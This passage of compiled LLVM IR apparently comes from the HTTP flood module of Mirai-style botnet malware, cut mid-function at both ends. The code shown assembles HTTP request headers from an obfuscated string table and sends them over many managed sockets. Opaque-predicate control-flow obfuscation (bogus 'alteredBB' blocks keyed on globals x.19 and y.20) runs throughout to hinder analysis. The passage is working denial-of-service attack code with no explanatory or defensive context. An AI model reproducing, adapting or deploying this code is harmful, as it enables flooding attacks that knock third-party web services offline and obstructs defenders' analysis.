  %851 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %852 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %851, i32 0, i32 0
  store i32 -1, i32* %852, align 4
  br label %1546

; <label>:853:                                    ; preds = %837
  %854 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %855 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %854, i32 0, i32 0
  %856 = load i32, i32* %855, align 4
  %857 = srem i32 %856, 64
  %858 = zext i32 %857 to i64
  %859 = shl i64 1, %858
  %860 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %861 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %862 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %861, i32 0, i32 0
  %863 = load i32, i32* %862, align 4
  %864 = sdiv i32 %863, 64
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds [16 x i64], [16 x i64]* %860, i64 0, i64 %865
  %867 = load i64, i64* %866, align 8
  %868 = or i64 %867, %859
  store i64 %868, i64* %866, align 8
  %869 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %870 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %869, i32 0, i32 0
  %871 = load i32, i32* %870, align 4
  %872 = load i32, i32* %31, align 4
  %873 = icmp sgt i32 %871, %872
  br i1 %873, label %874, label %895

; <label>:874:                                    ; preds = %853
  %875 = load i32, i32* @x.19
  %876 = load i32, i32* @y.20
  %877 = sub i32 %875, 1
  %878 = mul i32 %875, %877
  %879 = urem i32 %878, 2
  %880 = icmp eq i32 %879, 0
  %881 = icmp slt i32 %876, 10
  %882 = or i1 %880, %881
  br i1 %882, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %874
  %883 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %884 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %883, i32 0, i32 0
  %885 = load i32, i32* %884, align 4
  %886 = add nsw i32 %885, 1
  store i32 %886, i32* %31, align 4
  %887 = load i32, i32* @x.19
  %888 = load i32, i32* @y.20
  %889 = sub i32 %887, 1
  %890 = mul i32 %887, %889
  %891 = urem i32 %890, 2
  %892 = icmp eq i32 %891, 0
  %893 = icmp slt i32 %888, 10
  %894 = or i1 %892, %893
  br i1 %894, label %originalBBpart285, label %originalBB78alteredBB

originalBBpart285:                                ; preds = %originalBB78
  br label %895

; <label>:895:                                    ; preds = %originalBBpart285, %853
  br label %1544

; <label>:896:                                    ; preds = %originalBBpart276
  %897 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %898 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %897, i32 0, i32 1
  %899 = load i8, i8* %898, align 4
  %900 = zext i8 %899 to i32
  %901 = icmp eq i32 %900, 4
  br i1 %901, label %902, label %1256

; <label>:902:                                    ; preds = %896
  %903 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %904 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %903, i32 0, i32 14
  store i32 -1, i32* %904, align 4
  %905 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %906 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %905, i32 0, i32 11
  store i32 0, i32* %906, align 4
  %907 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %908 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %907, i32 0, i32 18
  %909 = getelementptr inbounds [1024 x i8], [1024 x i8]* %908, i32 0, i32 0
  call void @util_zero(i8* %909, i32 1024)
  %910 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %911 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %910, i32 0, i32 17
  store i32 0, i32* %911, align 4
  %912 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  call void @util_zero(i8* %912, i32 10240)
  %913 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %914 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %915 = call i32 @util_strlen(i8* %914)
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds i8, i8* %913, i64 %916
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 9
  %920 = getelementptr inbounds [9 x i8], [9 x i8]* %919, i32 0, i32 0
  %921 = call i32 @util_strcpy(i8* %917, i8* %920)
  %922 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %923 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %924 = call i32 @util_strlen(i8* %923)
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds i8, i8* %922, i64 %925
  %927 = call i32 @util_strcpy(i8* %926, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %928 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %929 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %930 = call i32 @util_strlen(i8* %929)
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds i8, i8* %928, i64 %931
  %933 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %934 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %933, i32 0, i32 6
  %935 = getelementptr inbounds [257 x i8], [257 x i8]* %934, i32 0, i32 0
  %936 = call i32 @util_strcpy(i8* %932, i8* %935)
  %937 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %938 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %939 = call i32 @util_strlen(i8* %938)
  %940 = sext i32 %939 to i64
  %941 = getelementptr inbounds i8, i8* %937, i64 %940
  %942 = call i32 @util_strcpy(i8* %941, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %943 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %944 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %945 = call i32 @util_strlen(i8* %944)
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds i8, i8* %943, i64 %946
  %948 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %949 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %948, i32 0, i32 5
  %950 = getelementptr inbounds [512 x i8], [512 x i8]* %949, i32 0, i32 0
  %951 = call i32 @util_strcpy(i8* %947, i8* %950)
  %952 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %953 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %954 = call i32 @util_strlen(i8* %953)
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds i8, i8* %952, i64 %955
  %957 = call i32 @util_strcpy(i8* %956, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %958 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %959 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %960 = call i32 @util_strlen(i8* %959)
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds i8, i8* %958, i64 %961
  %963 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %964 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %963, i32 0, i32 7
  %965 = getelementptr inbounds [129 x i8], [129 x i8]* %964, i32 0, i32 0
  %966 = call i32 @util_strcpy(i8* %962, i8* %965)
  %967 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %968 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %969 = call i32 @util_strlen(i8* %968)
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds i8, i8* %967, i64 %970
  %972 = call i32 @util_strcpy(i8* %971, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 32)
  %973 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %974 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %975 = call i32 @util_strlen(i8* %974)
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds i8, i8* %973, i64 %976
  %978 = call i8* @table_retrieve_val(i32 32, i32* null)
  %979 = call i32 @util_strcpy(i8* %977, i8* %978)
  call void @table_lock_val(i8 zeroext 32)
  %980 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %981 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %982 = call i32 @util_strlen(i8* %981)
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds i8, i8* %980, i64 %983
  %985 = call i32 @util_strcpy(i8* %984, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 33)
  %986 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %987 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %988 = call i32 @util_strlen(i8* %987)
  %989 = sext i32 %988 to i64
  %990 = getelementptr inbounds i8, i8* %986, i64 %989
  %991 = call i8* @table_retrieve_val(i32 33, i32* null)
  %992 = call i32 @util_strcpy(i8* %990, i8* %991)
  call void @table_lock_val(i8 zeroext 33)
  %993 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %994 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %995 = call i32 @util_strlen(i8* %994)
  %996 = sext i32 %995 to i64
  %997 = getelementptr inbounds i8, i8* %993, i64 %996
  %998 = call i32 @util_strcpy(i8* %997, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 34)
  %999 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1000 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1001 = call i32 @util_strlen(i8* %1000)
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds i8, i8* %999, i64 %1002
  %1004 = call i8* @table_retrieve_val(i32 34, i32* null)
  %1005 = call i32 @util_strcpy(i8* %1003, i8* %1004)
  call void @table_lock_val(i8 zeroext 34)
  %1006 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1007 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1008 = call i32 @util_strlen(i8* %1007)
  %1009 = sext i32 %1008 to i64
  %1010 = getelementptr inbounds i8, i8* %1006, i64 %1009
  %1011 = call i32 @util_strcpy(i8* %1010, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1012 = load i8*, i8** %22, align 8
  %1013 = icmp ne i8* %1012, null
  br i1 %1013, label %1014, label %1071

; <label>:1014:                                   ; preds = %902
  %1015 = load i32, i32* @x.19
  %1016 = load i32, i32* @y.20
  %1017 = sub i32 %1015, 1
  %1018 = mul i32 %1015, %1017
  %1019 = urem i32 %1018, 2
  %1020 = icmp eq i32 %1019, 0
  %1021 = icmp slt i32 %1016, 10
  %1022 = or i1 %1020, %1021
  br i1 %1022, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %1014
  call void @table_unlock_val(i8 zeroext 35)
  %1023 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1024 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1025 = call i32 @util_strlen(i8* %1024)
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds i8, i8* %1023, i64 %1026
  %1028 = call i8* @table_retrieve_val(i32 35, i32* null)
  %1029 = call i32 @util_strcpy(i8* %1027, i8* %1028)
  call void @table_lock_val(i8 zeroext 35)
  %1030 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1031 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1032 = call i32 @util_strlen(i8* %1031)
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds i8, i8* %1030, i64 %1033
  %1035 = call i32 @util_strcpy(i8* %1034, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1036 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1037 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1038 = call i32 @util_strlen(i8* %1037)
  %1039 = sext i32 %1038 to i64
  %1040 = getelementptr inbounds i8, i8* %1036, i64 %1039
  %1041 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1042 = call i32 @util_strcpy(i8* %1040, i8* %1041)
  %1043 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1044 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1045 = call i32 @util_strlen(i8* %1044)
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds i8, i8* %1043, i64 %1046
  %1048 = call i32 @util_strcpy(i8* %1047, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %1049 = load i8*, i8** %22, align 8
  %1050 = call i32 @util_strlen(i8* %1049)
  %1051 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1052 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1053 = call i32 @util_strlen(i8* %1052)
  %1054 = sext i32 %1053 to i64
  %1055 = getelementptr inbounds i8, i8* %1051, i64 %1054
  %1056 = call i8* @util_itoa(i32 %1050, i32 10, i8* %1055)
  %1057 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1058 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1059 = call i32 @util_strlen(i8* %1058)
  %1060 = sext i32 %1059 to i64
  %1061 = getelementptr inbounds i8, i8* %1057, i64 %1060
  %1062 = call i32 @util_strcpy(i8* %1061, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1063 = load i32, i32* @x.19
  %1064 = load i32, i32* @y.20
  %1065 = sub i32 %1063, 1
  %1066 = mul i32 %1063, %1065
  %1067 = urem i32 %1066, 2
  %1068 = icmp eq i32 %1067, 0
  %1069 = icmp slt i32 %1064, 10
  %1070 = or i1 %1068, %1069
  br i1 %1070, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %1071

; <label>:1071:                                   ; preds = %originalBBpart289, %902
  %1072 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1073 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1072, i32 0, i32 15
  %1074 = load i32, i32* %1073, align 4
  %1075 = icmp sgt i32 %1074, 0
  br i1 %1075, label %1076, label %1134

; <label>:1076:                                   ; preds = %1071
  %1077 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1078 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1079 = call i32 @util_strlen(i8* %1078)
  %1080 = sext i32 %1079 to i64
  %1081 = getelementptr inbounds i8, i8* %1077, i64 %1080
  %1082 = call i32 @util_strcpy(i8* %1081, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %18, align 4
  br label %1083

; <label>:1083:                                   ; preds = %originalBBpart2104, %1076
  %1084 = load i32, i32* %18, align 4
  %1085 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1086 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1085, i32 0, i32 15
  %1087 = load i32, i32* %1086, align 4
  %1088 = icmp slt i32 %1084, %1087
  br i1 %1088, label %1089, label %1127

; <label>:1089:                                   ; preds = %1083
  %1090 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1091 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1092 = call i32 @util_strlen(i8* %1091)
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds i8, i8* %1090, i64 %1093
  %1095 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1096 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1095, i32 0, i32 16
  %1097 = load i32, i32* %18, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1096, i64 0, i64 %1098
  %1100 = getelementptr inbounds [128 x i8], [128 x i8]* %1099, i32 0, i32 0
  %1101 = call i32 @util_strcpy(i8* %1094, i8* %1100)
  %1102 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1103 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1104 = call i32 @util_strlen(i8* %1103)
  %1105 = sext i32 %1104 to i64
  %1106 = getelementptr inbounds i8, i8* %1102, i64 %1105
  %1107 = call i32 @util_strcpy(i8* %1106, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %1108

; <label>:1108:                                   ; preds = %1089
  %1109 = load i32, i32* @x.19
  %1110 = load i32, i32* @y.20
  %1111 = sub i32 %1109, 1
  %1112 = mul i32 %1109, %1111
  %1113 = urem i32 %1112, 2
  %1114 = icmp eq i32 %1113, 0
  %1115 = icmp slt i32 %1110, 10
  %1116 = or i1 %1114, %1115
  br i1 %1116, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %1108
  %1117 = load i32, i32* %18, align 4
  %1118 = add nsw i32 %1117, 1
  store i32 %1118, i32* %18, align 4
  %1119 = load i32, i32* @x.19
  %1120 = load i32, i32* @y.20
  %1121 = sub i32 %1119, 1
  %1122 = mul i32 %1119, %1121
  %1123 = urem i32 %1122, 2
  %1124 = icmp eq i32 %1123, 0
  %1125 = icmp slt i32 %1120, 10
  %1126 = or i1 %1124, %1125
  br i1 %1126, label %originalBBpart2104, label %originalBB91alteredBB

originalBBpart2104:                               ; preds = %originalBB91
  br label %1083

; <label>:1127:                                   ; preds = %1083
  %1128 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1129 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1130 = call i32 @util_strlen(i8* %1129)
  %1131 = sext i32 %1130 to i64
  %1132 = getelementptr inbounds i8, i8* %1128, i64 %1131
  %1133 = call i32 @util_strcpy(i8* %1132, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %1134

; <label>:1134:                                   ; preds = %1127, %1071
  %1135 = load i32, i32* @x.19
  %1136 = load i32, i32* @y.20
  %1137 = sub i32 %1135, 1
  %1138 = mul i32 %1135, %1137
  %1139 = urem i32 %1138, 2
  %1140 = icmp eq i32 %1139, 0
  %1141 = icmp slt i32 %1136, 10
  %1142 = or i1 %1140, %1141
  br i1 %1142, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %1134
  %1143 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1144 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1145 = call i32 @util_strlen(i8* %1144)
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds i8, i8* %1143, i64 %1146
  %1148 = call i32 @util_strcpy(i8* %1147, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1149 = load i8*, i8** %22, align 8
  %1150 = icmp ne i8* %1149, null
  %1151 = load i32, i32* @x.19
  %1152 = load i32, i32* @y.20
  %1153 = sub i32 %1151, 1
  %1154 = mul i32 %1151, %1153
  %1155 = urem i32 %1154, 2
  %1156 = icmp eq i32 %1155, 0
  %1157 = icmp slt i32 %1152, 10
  %1158 = or i1 %1156, %1157
  br i1 %1158, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %1150, label %1159, label %1167

; <label>:1159:                                   ; preds = %originalBBpart2108
  %1160 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1161 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1162 = call i32 @util_strlen(i8* %1161)
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds i8, i8* %1160, i64 %1163
  %1165 = load i8*, i8** %22, align 8
  %1166 = call i32 @util_strcpy(i8* %1164, i8* %1165)
  br label %1167

; <label>:1167:                                   ; preds = %1159, %originalBBpart2108
  %1168 = load i32, i32* @x.19
  %1169 = load i32, i32* @y.20
  %1170 = sub i32 %1168, 1
  %1171 = mul i32 %1168, %1170
  %1172 = urem i32 %1171, 2
  %1173 = icmp eq i32 %1172, 0
  %1174 = icmp slt i32 %1169, 10
  %1175 = or i1 %1173, %1174
  br i1 %1175, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %1167
  %1176 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1176, i32 0, i32 9
  %1178 = getelementptr inbounds [9 x i8], [9 x i8]* %1177, i32 0, i32 0
  %1179 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1180 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1179, i32 0, i32 10
  %1181 = getelementptr inbounds [9 x i8], [9 x i8]* %1180, i32 0, i32 0
  %1182 = call signext i8 @util_strcmp(i8* %1178, i8* %1181)
  %1183 = icmp ne i8 %1182, 0
  %1184 = load i32, i32* @x.19
  %1185 = load i32, i32* @y.20
  %1186 = sub i32 %1184, 1
  %1187 = mul i32 %1184, %1186
  %1188 = urem i32 %1187, 2
  %1189 = icmp eq i32 %1188, 0
  %1190 = icmp slt i32 %1185, 10
  %1191 = or i1 %1189, %1190
  br i1 %1191, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %1183, label %1200, label %1192

; <label>:1192:                                   ; preds = %originalBBpart2112
  %1193 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1193, i32 0, i32 9
  %1195 = getelementptr inbounds [9 x i8], [9 x i8]* %1194, i32 0, i32 0
  %1196 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1196, i32 0, i32 10
  %1198 = getelementptr inbounds [9 x i8], [9 x i8]* %1197, i32 0, i32 0
  %1199 = call i32 @util_strcpy(i8* %1195, i8* %1198)
  br label %1200

; <label>:1200:                                   ; preds = %1192, %originalBBpart2112
  %1201 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1202 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1201, i32 0, i32 0
  %1203 = load i32, i32* %1202, align 4
  %1204 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1205 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1206 = call i32 @util_strlen(i8* %1205)
  %1207 = sext i32 %1206 to i64
  %1208 = call i64 @send(i32 %1203, i8* %1204, i64 %1207, i32 16384)
  %1209 = load i32, i32* %35, align 4
  %1210 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1210, i32 0, i32 3
  store i32 %1209, i32* %1211, align 4
  %1212 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1212, i32 0, i32 1
  store i8 6, i8* %1213, align 4
  %1214 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1215 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1214, i32 0, i32 0
  %1216 = load i32, i32* %1215, align 4
  %1217 = srem i32 %1216, 64
  %1218 = zext i32 %1217 to i64
  %1219 = shl i64 1, %1218
  %1220 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1221 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1222 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1221, i32 0, i32 0
  %1223 = load i32, i32* %1222, align 4
  %1224 = sdiv i32 %1223, 64
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds [16 x i64], [16 x i64]* %1220, i64 0, i64 %1225
  %1227 = load i64, i64* %1226, align 8
  %1228 = or i64 %1227, %1219
  store i64 %1228, i64* %1226, align 8
  %1229 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1230 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1229, i32 0, i32 0
  %1231 = load i32, i32* %1230, align 4
  %1232 = load i32, i32* %31, align 4
  %1233 = icmp sgt i32 %1231, %1232
  br i1 %1233, label %1234, label %1255

; <label>:1234:                                   ; preds = %1200
  %1235 = load i32, i32* @x.19
  %1236 = load i32, i32* @y.20
  %1237 = sub i32 %1235, 1
  %1238 = mul i32 %1235, %1237
  %1239 = urem i32 %1238, 2
  %1240 = icmp eq i32 %1239, 0
  %1241 = icmp slt i32 %1236, 10
  %1242 = or i1 %1240, %1241
  br i1 %1242, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %1234
  %1243 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1244 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1243, i32 0, i32 0
  %1245 = load i32, i32* %1244, align 4
  %1246 = add nsw i32 %1245, 1
  store i32 %1246, i32* %31, align 4
  %1247 = load i32, i32* @x.19
  %1248 = load i32, i32* @y.20
  %1249 = sub i32 %1247, 1
  %1250 = mul i32 %1247, %1249
  %1251 = urem i32 %1250, 2
  %1252 = icmp eq i32 %1251, 0
  %1253 = icmp slt i32 %1248, 10
  %1254 = or i1 %1252, %1253
  br i1 %1254, label %originalBBpart2124, label %originalBB114alteredBB

originalBBpart2124:                               ; preds = %originalBB114
  br label %1255

; <label>:1255:                                   ; preds = %originalBBpart2124, %1200
  br label %1527

; <label>:1256:                                   ; preds = %896
  %1257 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1257, i32 0, i32 1
  %1259 = load i8, i8* %1258, align 4
  %1260 = zext i8 %1259 to i32
  %1261 = icmp eq i32 %1260, 6
  br i1 %1261, label %1262, label %1321

; <label>:1262:                                   ; preds = %1256
  %1263 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1263, i32 0, i32 0
  %1265 = load i32, i32* %1264, align 4
  %1266 = srem i32 %1265, 64
  %1267 = zext i32 %1266 to i64
  %1268 = shl i64 1, %1267
  %1269 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1270 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1270, i32 0, i32 0
  %1272 = load i32, i32* %1271, align 4
  %1273 = sdiv i32 %1272, 64
  %1274 = sext i32 %1273 to i64
  %1275 = getelementptr inbounds [16 x i64], [16 x i64]* %1269, i64 0, i64 %1274
  %1276 = load i64, i64* %1275, align 8
  %1277 = or i64 %1276, %1268
  store i64 %1277, i64* %1275, align 8
  %1278 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1278, i32 0, i32 0
  %1280 = load i32, i32* %1279, align 4
  %1281 = load i32, i32* %31, align 4
  %1282 = icmp sgt i32 %1280, %1281
  br i1 %1282, label %1283, label %1304

; <label>:1283:                                   ; preds = %1262
  %1284 = load i32, i32* @x.19
  %1285 = load i32, i32* @y.20
  %1286 = sub i32 %1284, 1
  %1287 = mul i32 %1284, %1286
  %1288 = urem i32 %1287, 2
  %1289 = icmp eq i32 %1288, 0
  %1290 = icmp slt i32 %1285, 10
  %1291 = or i1 %1289, %1290
  br i1 %1291, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1283
  %1292 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1293 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1292, i32 0, i32 0
  %1294 = load i32, i32* %1293, align 4
  %1295 = add nsw i32 %1294, 1
  store i32 %1295, i32* %31, align 4
  %1296 = load i32, i32* @x.19
  %1297 = load i32, i32* @y.20
  %1298 = sub i32 %1296, 1
  %1299 = mul i32 %1296, %1298
  %1300 = urem i32 %1299, 2
  %1301 = icmp eq i32 %1300, 0
